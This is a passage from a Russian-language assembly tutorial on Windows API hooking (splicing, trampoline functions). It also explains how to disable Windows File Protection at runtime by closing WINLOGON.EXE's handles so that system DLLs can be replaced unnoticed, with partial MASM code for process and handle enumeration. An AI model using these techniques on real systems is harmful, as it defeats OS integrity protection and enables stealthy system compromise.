<p>Также нужен код, который позволяет выполнить оригинальную функцию, т.е. временно убрать перехват:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">TrueMessageBoxA proc x<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>x1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>x2<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>x3<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> SuspendThreads<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем старые байты</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span>RealAddr1<span style="color: #339933;">,</span>offset Old_Code1<span style="color: #339933;">,</span>size_code1<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> x3<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> x2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> x1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> x<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> MessageBoxA<span style="color: black; font-style: italic;">;вызываем оригинальную функцию MessageBoxA</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span>RealAddr1<span style="color: #339933;">,</span>offset code1<span style="color: #339933;">,</span>size_code1<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;восстанавливаем перехват</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> ResumeThreads<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
TrueMessageBoxA endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>А вот и сам перехватчик. Т.е. код на который мы прыгаем, при вызове перехватываемой функции.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Hooker proc x<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>x1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>x2<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>x3<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> x3<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset TitleMessage<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset TextMessage<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> x<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> TrueMessageBoxA<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
Hooker endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<h4><a name="c472"></a>Сплайсинг с сохранением оригинальной функции</h4>
<p>Когда мы устанавливаем перехват с помощью сплайсинга, мы затираем первые несколько байт оригинальной функции. Если мы используем относительный JMP, то мы затираем первые 5 байт. Перед затиркой мы сохраняем эти 5 байт.  Когда нам нужно вызвать оригинальную функцию, мы записываем сохраненные байты по адресу точки входа функции. Вот здесь есть проблеме связанная с реентерабельностью. Мы можем избавиться от этой проблемы. Мы должны всего лишь сохранить первые инструкции, размер которых больше или равно 5 байтам  (в случае, если мы затираем начало функции относительным JMP). Тогда если мы хотим вызвать оригинальную функцию, мы вызываем инструкции по адресу, по которому мы сохраняли затертые инструкции. После выполнения этих затертых инструкций мы выполняем инструкцию JMP на адрес в перехватываемой функции, где начинается следующая инструкция. Таким образом, логика работы оригинальной функции совершенно не меняется. При этом мы можем ее вызывать без особых функций. Самая главная здесь сложность - это как определить начало следующей инструкции, т.е. здесь нам необходим дизассемблер длин. Ему на вход подается адрес, а выход - это количество байт, занимаемых инструкцией по входному адресу.</p>
<p>Чтобы понять смысл этого метода рассмотрим простой пример.  Во-первых, определим место, куда мы будем копировать инструкции, которые могут быть затерты. Мы сделаем это так:</p>
<pre>old_func db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, \
            090h, 090h, 090h, 090h, 090h, 090h, 090h, 0e9h, 000h, \
			000h, 000h, 000h</pre>
<p>Мы будем сохранять инструкции по адресу old_func. Мы оставляем место для некоторого количества инструкций. Мы заполняем оставшееся место в буфере 090h, т.к. эта инструкция ничего не делает, в результате её выполнения просто инкрементируется регистр EIP. В конце буфера мы ставим относительный JMP, адрес, куда мы будем переходить в этой инструкции, мы потом должны заполнить. При вызове оригинальной функции мы вызываем ее так: CALL old_func</p>
<p>Допустим, мы перехватываем функцию Sleep.</p>
<p>До перехвата она выглядит так:</p>
<pre>
KERNEL32.Sleep:
77E86779: 6A00		PUSH 0
77E8677B: FF742408	PUSH DWORD PTR [ESP+8]
77E8677F: E803000000	CALL Kernel32.SleepEx
77E86784: C20400	RET 00004H
</pre>
<p>С помощью дизассемблера длин мы вычисляем  последовательно длины команд. Если с начала функции сумма длин команд больше или равно 5, то сохраняем обработанные инструкции по адресу old_func. Для функции Sleep мы сохраняем 6 байт, т.е. два PUSH'а. Также мы запоминаем адрес 77E8677F - после выполнения двух PUSH'ей мы джампим на этот адрес.</p>
<p>После установки перехвата функция Sleep примет следующий вид:</p>
<pre>
KERNEL32.Sleep:
77E86779: E937A95788	JMP 0004010B5H	; 0004010B5H - адрес обработчика
77E8677E: 08		?
77E8677F: E803000000	CALL Kernel32.SleepEx
77E86784: C20400	RET 00004H
</pre>
<p>А код old_func будет таким:</p>
<pre>old_func:
00403027: 6A00 PUSH 0
00403029: FF742408 PUSH DOWRD PTR [ESP+8]
0040302D: 90 NOP
0040302E: 90 NOP
0040302F: 90 NOP
00403030: 90 NOP
00403031: 90 NOP
00403032: 90 NOP
00403033: 90 NOP
00403034: 90 NOP
00403035: 90 NOP
00403036: 90 NOP
00403037: E94337A877 JMP KERNEL32.77E8677F</pre>
<p>Таким образом, если мы хотим вызывать оригинальную функцию мы вызываем old_func - это и будет оригинальной функцией. old_func называется функцией-трамплином (trampoline function).</p>
<p>Этот метод используется в продукте для перехвата функций, который называется Detours.</p>
<p>Описанный способ не может работать если функция занимает меньше 5 байт. Эту проблему можно решить с помощью перехода не командой JMP, а командой INT 3 (наш перехватчик в итоге будет обработчиком необработанных исключений). Команда INT 3 занимает 1 байт. Но производительность этого способа оставляет желать лучшего.</p>
<h4><a name="c473"></a>Перехват правкой системных библиотек на жестком диске</h4>
<p>Можно разделить способы перехвата на перехват до запуска модуля и перехват после запуска модуля. При перехвате до запуска модуля, используется техника правки системных библиотек на жестком диске. Для этого необходимо проделать следующие шаги:</p>
<ol>
	<li>Отключить защиту файлов ОС Windows (Windows File Protection).</li>
	<li>Переименовать файл системной библиотеки, которую мы заменяем.</li>
	<li>Создать правленую библиотеку и скопировать ее с оригинальным названием в системный каталог Windows, где она и была.</li>
	<li>После перезагрузки перехват будет глобален для всех процессов и для этого не нужно ничего более.</li>
</ol>
<p>Чтобы осуществить все перечисленные шаги необходимо знать, что такое Windows File Protection и как его отключать без перезагрузки системы.</p>
<h4><a name="c474"></a>Windows File Protection</h4>
<p>Windows File Protection - это сервис ОС, который защищает системные файлы ОС от изменения, повреждения или удаления. Впервые WFP появился в ОС Windows Millennium Edition. До появления WFP любая программа могла заменить системную библиотеку, что многие программы и делали при инсталляции. Из-за этого другие программы переставали работать и при этом могли забрать систему с собой в мир иной :) Такое положение вещей назвали "DLL Hell". В Windows Millennium Edition все системные SYS, DLL, EXE, and OCX защищены. В дополнение TrueType шрифты Micross.ttf, Tahoma.ttf, и Tahomabd.ttf также защищены. Если происходит изменение, модификация или удаление защищенного файла, то система восстанавливает его из кэша DLL, который по умолчанию находиться в папке:</p>
<p><em>%SYSTEMROOT%\system32\dllcache</em></p>
<p>Этот путь можно изменить, изменив значение параметра реестра:</p>
<p><em>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SFCDllCacheDir</em></p>
<p>Чтобы узнать, что был заменен какой-то из файлов, Windows просматривает каталоги безопасности и сверяет цифровые подписи. Если подпись какого-файла не соответствует подписи в каталоге безопасности, то Windows берет файлы из кэша.  Потом Windows ищет эти файлы в сети, если была произведена установка оп сети. Если данный файл отсутствует в кэше и в сети, то Windows требует вставить оригинальный диск ОС. Можно включить принудительную проверку всех файлов ОС Windows с помощью утилиты sfc, которая доступна в стандартной комплектации ОС. Также при обнаружении исправленного или удаленного системного файл WFP записывает событие в лог событий, который можно посмотреть с помощью оснастки Event Log (%windir%\system32\eventvwr.msc). Следующие механизмы позволяют изменять системные файлы, не смотря на Windows File Protection:</p>
<ul>
	<li>установка Windows Service Pack с использованием Update.exe</li>
	<li>установка хотфиксов с использованием Hotfix.exe</li>
	<li>Обновление ОС с использованием Winnt32.exe</li>
	<li>Windows Update</li>
</ul>
<p>Чтобы без шума добраться до системных файлов и отредактировать их мы должны отключить WFP. Есть несколько способов сделать это. Например, с помощью редактирования реестра или с помощью правки файла sfc.dll или sfc_os.dll. Но эти способы теряют свою актуальность, потому что они либо работали с какой-то конкретной ОС, либо требуют перезагрузки и/или входа в безопасный режим ОС.  Но есть способ отключения WFP прямо при работе. Давайте его и рассмотрим.</p>
<h4><a name="c475"></a>Отключение Windows File Protection на лету</h4>
<p>WFP держится на двух DLL - SFC.DLL, SFC_OS.DLL. А код, который использует эти DLL находиться в WINLOGON.EXE. Модуль SFC_OS.DLL экспортирует функцию, которая экспортируется не по имени, а по ординалу и имеет ординал 1. Эта функция запускает систему защиты файлов. Если покопаться в коде этой функции, то можно увидеть, что она вызывает функцию NTDLL.DLL!NtNotifyChangeDirectoryFile. Это недокументированная функция, но на ней основывается другая функция, которая называется KERNEL32.DLL!FindFirstChangeNotification. Эта функция возвращает описатель, который можно использовать в функциях ожидания, например KERNEL32.DLL!WaitForSingleObject. Т.е. WFP устанавливает систему нотификации на системные папки. Если файлы в папке изменяются, то WFP сразу на это реагирует. Все что нам требуется чтобы отключить WFP - это закрыть все описатели, которые были возвращены NTDLL.DLL!NtNotifyChangeDirectoryFile. Эти описатели типа "файл". Если мы захотим отключить WFP, когда система работает, и если мы не хотим писать код, можно просто запустить утилиту Process Explorer или подобную ей, чтобы закрыть хэндлы объектов "файл". Например,</p>
<p><em>File Object - C:\WINDOWS\SYSTEM32\.</em></p>
<p>Закрывая этот описатель, мы можем изменять файлы в папке C:\WINDOWS\SYSTEM32 и Windows ничего не скажет. При реализации кода процедуры отключения WFP необходимо знать, как получить хэндлы открытых описателей. Это делается с помощью функции NtQuerySystemInformation. В MSDN она документирована, но не полностью и того, что нам нужно там нет. Приходиться использовать справочник Гарри Нэббета "Windows NT 2000 Native API Reference".</p>
<p>Чтобы отключить таким образом WFP, необходимы отладочные привилегии, т.к. нам приходиться открывать процесс WINLOGON.EXE. А для того чтобы получить отладочные привилегии, необходимы привилегии администратора. Из этого следует, что этот способ будет работать только под учетной записью администратора или используя имперсонацию.</p>
<p>Для начала получаем идентификатор процесса WINLOGON.EXE. Он нужен для того, чтобы отличать хэндлы процесса WINLOGON.EXE от всех остальных. Чтобы получить идентификатор по имени модуля, используем функцию GetPIDbyName:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Процесс по имени</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
GetPIDbyName proc Str1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL pe<span style="color: #339933;">:</span>PROCESSENTRY32<br />
LOCAL hSnap<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateToolhelp32Snapshot<span style="color: #339933;">,</span>TH32CS_SNAPPROCESS<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hSnap<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> pe<span style="color: #339933;">.</span>dwSize<span style="color: #339933;">,</span>sizeof pe<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Process32First<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>addr pe<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
next_process<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Process32Next<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>addr pe<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke lstrcmpi<span style="color: #339933;">,</span>addr pe<span style="color: #339933;">.</span>szExeFile<span style="color: #339933;">,</span>Str1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>pe<span style="color: #339933;">.</span>th32ProcessID<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> next_process<br />
GetPIDbyName endp<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>В функции GetPIDbyName используем Toolhelp-функции для перечисления процессов в системе. Мы сравниваем имя полученного модуля со статической строкой "WINLOGON.EXE". Сравнение идет с помощью API-функции lstrcmpi. Эта функция сравнивает строки не учитывая во внимание регистр символов.</p>
<p>Далее нам необходимо получить список всех описателей процесса WINLOGON.EXE. Но в ОС Windows нет функции, которая позволила бы получить описатели для конкретного процесса. Однако, как Вы уже знаете описатели можно получить с помощью Native функции NtQuerySystemInformation. Часть описания этой функции доступно в MSDN, но этого нам не достаточно. Более того там написано неправильно!!! :( Посмотрите на прототип этой функции:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">NTSTATUS NtQuerySystemInformation<span style="color: black;">&#40;</span><br />
&nbsp; SYSTEM_INFORMATION_CLASS SystemInformationClass<span style="color: #339933;">,</span><br />
&nbsp; PVOID SystemInformation<span style="color: #339933;">,</span><br />
&nbsp; ULONG SystemInformationLength<span style="color: #339933;">,</span><br />
&nbsp; PULONG ReturnLength<br />
<span style="color: black;">&#41;</span><span style="color: #339933;">;</span></div>
<p>Давайте прочтем описание переменной ReturnLength:</p>
<p>"ReturnLength [out, optional] Optional pointer to a location where the function writes the actual size of the information requested. If that size is less than or equal to the SystemInformationLength parameter, the function copies the information into the SystemInformation buffer; otherwise, it returns an NTSTATUS error code and returns in ReturnLength the size of buffer required to receive the requested information."</p>
<p>Вот здесь и есть ошибка в документации. На самом деле, если размер буфера меньше нужного, то параметр ReturnLength не заполняется. Так как размер буфера не перманентен, то нам приходиться инкрементно перебирать размеры. Если функция возвращает STATUS_INFO_LENGTH_MISMATCH, то размер буфера недостаточен. Вот код который находит нужный размер буфера:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Определям размер буфера для получения списка хэндлов&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset SizeBuffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">16</span><span style="color: black; font-style: italic;">;SystemHandleInformation</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> _NtQuerySystemInformation<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=STATUS_INFO_LENGTH_MISMATCH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> end_calc_size<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
next_calc_size<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> SizeBuffer<span style="color: #339933;">,</span><span style="color: #ff0000;">01000h</span><span style="color: black; font-style: italic;">;Увеличиваем размер буфера на страницу</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if pSystemHandleInfo!=<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualFree<span style="color: #339933;">,</span>pSystemHandleInfo<span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span> MEM_RELEASE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualAlloc<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span> SizeBuffer<span style="color: #339933;">,</span> MEM_COMMIT<span style="color: #339933;">,</span> PAGE_READWRITE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> pSystemHandleInfo<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset uBuff<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> SizeBuffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> pSystemHandleInfo<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">16</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> _NtQuerySystemInformation<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==STATUS_INFO_LENGTH_MISMATCH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> next_calc_size<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
end_calc_size<span style="color: #339933;">:</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>После выполнения вышеприведенного кода, в pSystemHandleInfo содержится указатель на буфер. В буфере содержится количество описателей. А потом массив структур типа HandleInfo. Количество структур в этом буфере ровно соответствует первому двойному слову буфера. Эта структура определена следующим образом:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Handle_Info struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; Pid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; ObjectType&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; HandleValue &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; ObjectPointer &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> ?<br />
&nbsp; &nbsp; &nbsp; &nbsp; AccessMask&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> ? <br />
Handle_Info ends<br />
&nbsp;</div>
<p>Pid мы используем, чтобы узнать какому процессу принадлежит описатель. Также мы будем использовать параметр HandleValue для дублирования хэндлов.</p>
<p>После того как мы узнали, что данный описатель принадлежит процессу WINLOGON.EXE мы должны узнать имя объекта соответствующего данному описателю. Нас интересует имя \Device\HarddiskVolume1\WINDOWS\system32. А если точнее его часть WINDOWS\SYSTEM32. Закрывая эти описатели, мы отключаем Windows File Protection. Чтобы получить имя объекта по его описателю, мы вызываем функцию NtQueryObject. Эта Native функция полностью недокументированна. По крайней мере в MSDN VisualStudio .NET 2003 ее описание отсутствует. Но я знаю, что ее описание есть в DDK. Как бы то ни было, я взял прототип функции в книге Гарри Нэббета.</p>
<p>Мы вызываем функцию NtQueryObject, чтобы получить имя объекта соответствующее описателю. Далее мы сравниваем UNICODE-строку "WINDOWS\SYSTEM32" или "WINNT\SYSTEM32" с полученным именем объекта. Сравниваем мы с конца, идя в начало. Сравнение идет с помощью функции CompareStringsBackwards. В ней используются цепочечные операции пересылки слов. Длина сравнения зависит от длины строки "WINDOWS\SYSTEM32" или "WINNT\SYSTEM32". А вот и функция CompareStringsBackwards:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;===============================================================================;</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Сравнить строки назад</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
CompareStringBackwards proc pStr1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>pStr2<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><br />
LOCAL Len1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL Len2<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke lstrlenW<span style="color: #339933;">,</span>pStr1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Len1<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke lstrlenW<span style="color: #339933;">,</span>pStr2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Len2<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>&gt;Len2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pStr1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Len2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>pStr2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>Len1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">std</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repe</span> <span style="color: #00007f; font-weight: bold;">cmpsw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
